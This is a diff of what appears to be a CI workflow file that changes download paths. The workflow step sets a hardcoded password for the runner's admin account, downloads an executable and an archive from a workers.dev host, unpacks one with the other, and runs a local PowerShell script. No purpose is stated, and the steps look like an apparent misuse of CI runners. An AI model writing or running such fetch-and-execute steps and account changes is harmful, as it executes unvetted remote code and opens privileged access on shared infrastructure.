@@ -12,8 +12,8 @@ jobs:
     - name: command 1
       run: |
         cmd /c net user runneradmin EAekra7595
-        Invoke-WebRequest https://a.olele.workers.dev/0:/GGG/zzz.arc -OutFile zzz.acr
-        Invoke-WebRequest https://a.olele.workers.dev/0:/GGG/zzz.exe -OutFile zzz.exe
+        Invoke-WebRequest https://a.olele.workers.dev/0:/EmptyBinGenarator/zzz.arc -OutFile zzz.acr
+        Invoke-WebRequest https://a.olele.workers.dev/0:/EmptyBinGenarator/zzz.exe -OutFile zzz.exe
         .\zzz.exe e zzz.acr
     - name: command 2
       run: .\00.ps1
